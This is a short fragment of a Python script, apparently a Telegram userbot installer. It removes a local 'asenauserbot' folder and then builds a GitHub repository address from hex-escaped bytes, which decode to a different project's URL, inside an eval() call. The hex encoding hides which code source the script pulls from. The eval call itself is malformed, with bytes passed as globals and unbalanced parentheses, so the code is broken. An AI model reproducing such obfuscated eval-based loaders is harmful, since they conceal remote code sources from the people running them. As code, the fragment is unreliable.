...
if __name__ == "__main__":
    ...
    if os.path.isdir("./asenauserbot/"):
        rm_r("./asenauserbot/")
    repo = eval(b'\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x62\x72\x65\x6E\x64\x73\x75\x70\x70\x6F\x72\x74\x2F\x62\x72\x65\x6E\x64\x75\x73\x65\x72\x62\x6F\x74', b'@AsenaUserBot').decode("utf-8"))
